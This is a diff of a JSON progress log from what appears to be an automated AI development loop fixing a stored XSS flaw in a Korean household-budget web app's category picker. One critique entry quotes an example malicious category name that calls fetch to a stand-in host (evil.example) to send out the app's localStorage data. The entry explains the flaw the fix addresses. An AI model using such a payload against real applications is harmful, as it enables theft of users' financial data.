@@ -1,19 +1,8 @@
 {
-  "cycle": 82,
-  "phase": "advance",
-  "pending_advance_plan": {
-    "title": "openCatPicker() 카테고리명 onclick/속성 문자열보간 인젝션(XSS) 수정",
-    "why": "index.html:6149의 data-cat=\"${c}\" 및 onclick=\"pkPickCat('${c}')\"가 카테고리명을 이스케이프 없이 그대로 HTML 속성/인라인 JS 문자열에 보간한다. addCat()이 카테고리명 문자 제한이 전혀 없고, 이 피커는 거래/반복거래 추가·수정마다(txOpenCat/recOpenCat) 열리는 최다 사용 화면이며, JSON 백업 가져오기 경로로도 악성 카테고리명이 들어올 수 있어 실제 스크립트 실행으로 이어지는 저장형 인젝션이다.",
-    "approach": "1) openCatPicker(index.html:6149)에서 onclick 인라인 문자열 보간을 제거하고 data-cat=\"${esc(c)}\"만 남긴 뒤, 피커 컨테이너에 위임 클릭 리스너를 하나 달아 e.target.closest('.pk-cat')?.dataset.cat 값으로 pkPickCat을 호출하도록 바꾼다(문자열보간 자체를 없애 카테고리명 내용과 무관하게 안전). 2) 같은 onclick=\"...('${사용자문자열}')\" 패턴이 다른 피커(openCatManage, openOwnerPicker 등)에도 있는지 전수 확인해 있으면 동일하게 수정한다 — openCurrencyPicker는 c.code가 고정 목록이라 안전함을 이미 확인. 3) test/run.js에 작은따옴표/큰따옴표/</script> 등을 포함한 카테고리명으로 openCatPicker 렌더 결과가 속성을 깨뜨리지 않고 onclick에 문자열보간이 재도입되지 않았음을 확인하는 회귀 테스트를 추가한다(esc 호출 여부가 아니라 결과 마크업의 형태를 검증). 4) APP_VERSION/sw.js CACHE 버전을 올린다."
-  },
+  "cycle": 83,
+  "phase": "develop",
+  "pending_advance_plan": null,
   "history": [
-    {
-      "cycle": 77,
-      "phase": "advance",
-      "timestamp": "2026-09-24T08:10:00.000Z",
-      "summary": "critique 계획(household_id 기반 실제 공유 기능)을 advance 착수 전 재평가: 새 Supabase 테이블(household_invites)과 인증 의미론 변경이 필요해 로컬 테스트로는 실제 다중 계정 시나리오를 검증할 수 없고, 무인 사이클이 운영 중인 사용자의 Supabase 백엔드 스키마를 잘못 건드리면 되돌리기 어려움 — cycle76이 hot/archive 분리를 보류한 것과 같은 이유로 이번 사이클은 계획에 이미 준비돼 있던 최소 침습 대안(백엔드 위험 0)만 구현. '귀속(owner)'이 계정 경계가 아니라 같은 로그인 안의 라벨일 뿐임을 귀속 관리 시트(openOwnerManage) 설명에 명시하고, 계정 화면(openAccountSheet)의 클라우드 안내 문구에 '같은 이메일 계정으로 로그인해야만 데이터가 공유되고, 계정을 따로 만들면 서로의 기록이 보이지 않는다'를 추가했으며, openHelpCloud에 '5) 배우자·가족과 함께 쓰려면' 단락을 새로 넣어 현재 구조의 한계와 유일한 우회(같은 로그인을 여러 기기에서 공유)의 위험(비밀번호 공유, 비밀번호 변경/계정 삭제 시 다른 기기 로그아웃)을 안내했다. 코드 로직·데이터 포맷·클라우드 동기화 경로는 전혀 건드리지 않은 순수 UI 문구 변경이라 회귀 위험 없음(<script> 블록 2개 node --check 통과, node test/run.js 527/527 그대로 통과). APP_VERSION 1.46.25->1.46.26, sw.js CACHE v187->v188. 실제 다계정 household 공유 기능은 이후 critique가 백엔드 검증 방법(예: 스테이징 Supabase 프로젝트)이 갖춰졌을 때 다시 제안할 것.",
-      "commit": null
-    },
     {
       "cycle": 78,
       "phase": "develop",
@@ -145,6 +134,13 @@
       "phase": "critique",
       "timestamp": "2026-09-25T03:11:07.360Z",
       "summary": "general-purpose 서브에이전트로 앱 전체 재검토. openCatPicker(o)(index.html:6149)가 카테고리 이름 c를 렌더할 때 표시 텍스트만 esc(c)로 이스케이프하고, data-cat=\"${c}\" 속성값과 onclick=\"pkPickCat('${c}')\" 인라인 JS 문자열 인자에는 이스케이프 없이 그대로 문자열보간해 넣는 인젝션 취약점 발견. addCat(k)(index.html:4337)는 카테고리명에 대해 공백/중복 체크만 하고 문자 제한이 전혀 없어 사용자가 예: x');fetch('https://evil.example/?c='+localStorage.getItem('asset_app_db_v3'));// 같은 이름으로 카테고리를 만들면 onclick 속성이 그대로 실행 가능한 JS로 깨진다. sanitizeBackup()(index.html:4946+)도 금액/수량만 숫자 클램프할 뿐 카테고리명 등 문자열 필드는 검증하지 않아 조작된 백업 JSON을 가져와도 같은 경로로 주입될 수 있음. openCatPicker는 txOpenCat()(3303)/recOpenCat()(3479)에서 호출돼 거래·반복거래 추가/수정마다 열리는 가장 자주 쓰는 화면이라 우선순위 최상. 코드베이스 전반이 esc() 헬퍼(48곳)로 이스케이프를 일관되게 적용하는데 이 지점만 속성/JS 인자 컨텍스트에서 누락된 예외. openCurrencyPicker(index.html:6144)는 c.code(고정 통화코드 목록)라 위험 없음, openCatManage/openOwnerPicker 등 다른 피커도 확인 필요.",
+      "commit": null
+    },
+    {
+      "cycle": 82,
+      "phase": "advance",
+      "timestamp": "2026-09-25T04:10:00.000Z",
+      "summary": "critique 계획대로 openCatPicker(o)(index.html:6149)의 카테고리명 onclick/속성 문자열보간 인젝션 수정. data-cat=\"${c}\"와 onclick=\"pkPickCat('${c}')\" 인라인 보간을 없애고 data-cat=\"${esc(c)}\"만 남긴 뒤, openPicker() 호출 직후 $('catGrid')에 클릭 위임 리스너 하나를 달아 e.target.closest('.pk-cat')?.dataset.cat 값으로 pkPickCat을 호출하도록 바꿔 카테고리명 내용과 무관하게 안전해지도록 함(esc()는 attribute를 HTML 엔티티로만 바꾸고 브라우저가 .dataset 읽을 때 자동으로 디코드하므로 pkPickCat 내부의 dataset.cat===c 비교 로직은 그대로 유지됨). 계획의 2단계(다른 피커 전수 확인)도 수행: openOwnerPicker는 onclick=\"pkPickOwner(${i})\"로 인덱스만 넘겨 안전, openCatManage의 renameCatSheet/delCat/toggleCatVarUI도 전부 카테고리명이 아니라 고정 kind 문자열+인덱스만 onclick에 넣어 안전함을 재확인 — openCatPicker가 유일한 취약 지점이었음. test/run.js FUNCTIONS에 openCatPicker 추가, sandbox.openPicker의 lastPickerHtml을 이용해 정상 카테고리명 렌더(on 클래스 확인 포함)/작은따옴표+세미콜론 포함 카테고리명(onclick 문자열보간 재도입 여부)/큰따옴표 포함 카테고리명(속성 탈출로 새 HTML 속성 주입 여부) 3개 회귀 테스트 추가 — 고침 전 코드로 되돌려(git stash) 3개 모두 실제로 실패함을 확인한 뒤 재적용. 두 인라인 <script> 블록 node --check 통과, node test/run.js 563/563 통과(기존 560 + 신규 3). APP_VERSION 1.46.34->1.46.35, sw.js CACHE v196->v197.",
       "commit": null
     }
   ]
